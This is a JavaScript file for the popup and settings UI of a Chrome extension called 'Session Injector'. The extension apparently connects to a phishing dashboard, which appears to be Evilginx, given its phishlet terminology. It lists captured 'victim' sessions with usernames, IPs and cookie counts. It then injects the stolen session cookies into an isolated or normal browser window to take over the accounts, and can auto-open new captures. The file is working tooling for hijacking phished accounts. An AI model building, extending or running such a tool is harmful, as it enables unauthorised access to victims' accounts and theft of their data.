/* Session Injector - shared UI logic for popup + options. */
'use strict';

var SI = (function () {
  var MARK = '<svg class="mark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M13.4 2.6 6 13.2h4.6L9.4 21.4 17 10.6h-4.6z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round" stroke-linecap="round"/></svg>';
  var ICO = {
    ext: '<path d="M14 4h6v6"/><path d="M20 4l-9 9"/><path d="M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/>',
    here: '<rect x="3" y="4" width="18" height="14" rx="1.6"/><path d="M8 21h8"/>',
    trash: '<path d="M4 7h16M9 7V5h6v2M6 7l1 13h10l1-13"/>',
    dash: '<rect x="3" y="4" width="18" height="16" rx="1.6"/><path d="M3 9h18M8 14h8"/>',
    chev: '<path d="M9 6l6 6-6 6"/>',
    shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>'
  };
  function ico(n) { return ICO[n] ? '<svg class="ic" viewBox="0 0 24 24">' + ICO[n] + '</svg>' : ''; }
  function esc(v) {
    if (v === null || v === undefined) return '';
    return String(v).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function send(msg) {
    return new Promise(function (res) {
      try { chrome.runtime.sendMessage(msg, function (r) { res(r || {}); }); }
      catch (e) { res({ error: String(e.message || e) }); }
    });
  }
  function fmt(ts) {
    if (!ts) return '';
    var d = Date.now() - ts;
    if (d < 60000) return Math.max(1, Math.round(d / 1000)) + 's ago';
    if (d < 3600000) return Math.round(d / 60000) + 'm ago';
    if (d < 86400000) return Math.round(d / 3600000) + 'h ago';
    return new Date(ts).toLocaleDateString();
  }
  function toast(msg, kind) {
    var el = document.getElementById('toast');
    if (!el) return;
    el.className = 'toast ' + (kind || 'info');
    el.textContent = msg;
    el.style.display = 'block';
    clearTimeout(el._t);
    el._t = setTimeout(function () { el.style.display = 'none'; }, 2600);
  }

  var state = null;
  var wide = false;

  function victim(e) {
    return (e && (e.username || e.phishlet)) ? (e.username || '(' + e.phishlet + ')') : 'unknown';
  }

  function sessionItem(e, limit) {
    var label = victim(e);
    return '<div class="item" data-act="open-recent" data-id="' + esc(e.id) + '">' +
      '<span>' + ico('shield') + '</span>' +
      '<span class="meta"><span class="t1">' + esc(label) + '</span>' +
      '<span class="t2">#' + esc(e.id) + ' ' + esc(e.phishlet || '') + (e.ip ? ' ' + esc(e.ip) : '') + ' ' + fmt(e.at) + '</span></span>' +
      '<span class="badge mut">' + (e.count || 0) + ' ck</span>' +
      '<span class="go">' + ico('chev') + '</span></div>';
  }

  function render() {
    var st = state || {};
    var set = st.settings || {};
    var recent = st.recent || [];
    var cur = st.current || null;
    var connected = st.connected;

    var h = '<div class="sec"><div class="lbl">Status</div>' +
      '<div class="card"><div class="row" style="margin-bottom:6px">' +
      '<span class="dot ' + (connected ? 'on' : '') + '"></span>' +
      '<span>' + (connected ? 'Dashboard connected' : 'No dashboard tab open') + '</span></div>' +
      '<div class="row"><span class="dot ' + (st.window ? 'on' : 'warn') + '"></span>' +
      '<span class="muted">' + (st.window ? (st.window.incognito ? 'Isolated window open' : 'Window open (no incognito)') : 'No isolated window yet') + '</span>' +
      (st.window ? '<button class="btn sm right" style="margin-left:auto" data-act="focus">Focus</button>' : '') +
      '</div></div></div>';

    if (cur) {
      h += '<div class="sec"><div class="lbl">Selected session</div><div class="card">' +
        '<div class="kv"><span class="k">Session</span><span class="v">#' + esc(cur.sessionId) + '</span>' +
        '<span class="k">Phishlet</span><span class="v">' + esc(cur.phishlet || '-') + '</span>' +
        '<span class="k">Cookies</span><span class="v">' + (cur.hasTokens ? 'captured' : 'none') + '</span></div>' +
        '<div class="grid2" style="margin-top:9px">' +
        '<button class="btn primary" data-act="open-current" data-id="' + esc(cur.sessionId) + '">' + ico('ext') + ' Isolated</button>' +
        '<button class="btn" data-act="open-current-here" data-id="' + esc(cur.sessionId) + '">' + ico('here') + ' Here</button>' +
        '</div></div></div>';
    }

    if (st.active) {
      h += '<div class="sec"><div class="lbl">Live in the isolated window</div><div class="card">' +
        '<div class="kv"><span class="k">Victim</span><span class="v">' + esc(victim(st.active)) + '</span>' +
        '<span class="k">Session</span><span class="v">#' + esc(st.active.id) + '</span>' +
        '<span class="k">Since</span><span class="v">' + fmt(st.active.at) + '</span></div>' +
        '<div class="grid2" style="margin-top:9px">' +
        '<button class="btn" data-act="focus">' + ico('ext') + ' Focus window</button>' +
        '<button class="btn danger" data-act="clear">' + ico('trash') + ' Clear</button>' +
        '</div></div></div>';
    }

    h += '<div class="sec"><div class="lbl">Recent sessions' +
      (recent.length > 4 && !wide ? '<span class="right"><a data-act="options">all ' + recent.length + '</a></span>' : '') + '</div>';
    if (!recent.length) {
      h += '<div class="empty">Nothing yet. Take over a session from the dashboard.</div>';
    } else {
      h += '<div class="list">' + recent.slice(0, wide ? 50 : 4).map(function (e) { return sessionItem(e); }).join('') + '</div>';
    }
    h += '</div>';

    h += '<div class="sec"><div class="lbl">Behaviour</div><div class="card">' +
      '<label class="sw mb8" style="padding:2px 0"><input type="checkbox" data-set="autoOpen"' + (set.autoOpen ? ' checked' : '') + '><span class="track"></span>' +
      '<span>Auto-open new captures</span></label>' +
      (set.autoOpen && !set.dashboardUrl && !set.user
        ? '<div class="hint dim" style="margin:-2px 0 8px">Needs a dashboard URL and login below.</div>' : '') +
      '<div class="field" style="margin:8px 0 0"><label class="dim" style="font-size:10.5px">Default target</label>' +
      '<select data-set="mode"><option value="isolated"' + (set.mode === 'isolated' ? ' selected' : '') + '>Isolated window (recommended)</option>' +
      '<option value="here"' + (set.mode === 'here' ? ' selected' : '') + '>This profile</option></select></div>' +
      '</div></div>';

    if (wide) {
      h += '<div class="sec"><div class="lbl">Dashboard link</div><div class="card">' +
        '<div class="field"><label class="dim" style="font-size:10.5px">Base URL</label><input type="text" data-set="dashboardUrl" value="' + esc(set.dashboardUrl || '') + '" placeholder="http://127.0.0.1:5000"></div>' +
        '<div class="grid2"><div class="field"><label class="dim" style="font-size:10.5px">User</label><input type="text" data-set="user" value="' + esc(set.user || '') + '"></div>' +
        '<div class="field"><label class="dim" style="font-size:10.5px">Password</label><input type="password" data-set="pass" value="' + esc(set.pass || '') + '"></div></div>' +
        '<div class="hint dim">Lets the popup take over any session without the dashboard tab open.</div>' +
        '<div class="actions" style="margin-top:9px"><button class="btn" data-act="save">Save</button>' +
        '<button class="btn" data-act="open-dash">' + ico('dash') + ' Open dashboard</button></div></div></div>';
    }

    if (st.window && !st.window.incognito) {
      h += '<div class="sec"><div class="note warn">' + ico('shield') + '<span>Incognito is unavailable, so the window shares your normal cookie jar. Allow the extension in incognito, or use a separate Chrome profile.</span></div></div>';
    }

    document.getElementById('main').innerHTML = h;
    var f = document.getElementById('foot');
    if (f) {
      f.innerHTML = '<span class="dim">' + (set.mode === 'isolated' ? 'isolated' : 'this profile') + '</span>' +
        '<span style="margin-left:auto"></span>' +
        (wide ? '' : '<a data-act="options">Settings</a>');
    }
  }

  function open(payload, mode) {
    return send({ action: 'inject', payload: payload, mode: mode || (state.settings || {}).mode }).then(function (r) {
      if (r.error) toast(r.error, 'err');
      else toast((r.success || 0) + ' cookies -> ' + (r.where || '') + (r.failed ? ', ' + r.failed + ' failed' : ''), r.failed ? 'info' : 'ok');
      return refresh();
    });
  }

  function refresh() {
    return Promise.all([
      send({ action: 'state' }),
      chrome.storage.local.get(['dashboardConnected', 'currentSession']),
    ]).then(function (r) {
      var st = r[0] || {};
      var ls = r[1] || {};
      st.connected = !!ls.dashboardConnected;
      st.current = ls.currentSession || null;
      state = st;
      if (!state.settings) state.settings = {};
      render();
    });
  }

  var ACTIONS = {
    'open-current': function (id) { send({ action: 'injectById', id: id, mode: 'isolated' }).then(function (r) { if (r.error) toast(r.error, 'err'); else toast((r.success || 0) + ' cookies -> isolated', 'ok'); refresh(); }); },
    'open-current-here': function (id) { send({ action: 'injectById', id: id, mode: 'here' }).then(function (r) { if (r.error) toast(r.error, 'err'); else toast('injected into this profile', 'ok'); refresh(); }); },
    'open-recent': function (id) {
      var e = (state.recent || []).find(function (x) { return String(x.id) === String(id); });
      if (e && e.cookies && e.cookies.length) {
        open({ session_id: e.id, phishlet: e.phishlet, username: e.username, remote_addr: e.ip, target_url: e.target_url, cookies: e.cookies }, state.settings.mode);
      } else {
        send({ action: 'injectById', id: id, mode: state.settings.mode }).then(function (r) { if (r.error) toast(r.error, 'err'); refresh(); });
      }
    },
    clear: function () { send({ action: 'clearIsolated' }).then(function (r) { toast('cleared ' + (r.cleared || 0) + ' cookies', 'ok'); refresh(); }); },
    focus: function () { chrome.windows.update(state.window.id, { focused: true }); },
    options: function () { chrome.runtime.openOptionsPage(); },
    'open-dash': function () {
      var u = (state.settings.dashboardUrl || '').replace(/\/+$/, '');
      if (u) chrome.tabs.create({ url: u }); else toast('set a dashboard url first', 'info');
    },
    save: function () {
      var patch = {};
      document.querySelectorAll('[data-set]').forEach(function (el) {
        patch[el.getAttribute('data-set')] = el.type === 'checkbox' ? el.checked : el.value.trim();
      });
      send({ action: 'settings', patch: patch }).then(function () { toast('saved', 'ok'); refresh(); });
    },
  };

  function mount(isWide) {
    wide = !!isWide;
    document.body.className = wide ? 'options' : 'popup';
    document.addEventListener('click', function (e) {
      var el = e.target.closest('[data-act]');
      if (!el) return;
      var fn = ACTIONS[el.getAttribute('data-act')];
      if (fn) { e.preventDefault(); fn(el.getAttribute('data-id')); }
    });
    document.addEventListener('change', function (e) {
      var el = e.target;
      if (!el.hasAttribute || !el.hasAttribute('data-set')) return;
      if (el.type === 'checkbox' || el.tagName === 'SELECT') {
        var patch = {};
        patch[el.getAttribute('data-set')] = el.type === 'checkbox' ? el.checked : el.value;
        send({ action: 'settings', patch: patch });
      }
    });
    chrome.storage.onChanged.addListener(function (c, area) { if (area === 'local') refresh(); });
    refresh();
  }

  return { mount: mount, refresh: refresh, esc: esc, MARK: MARK };
})();
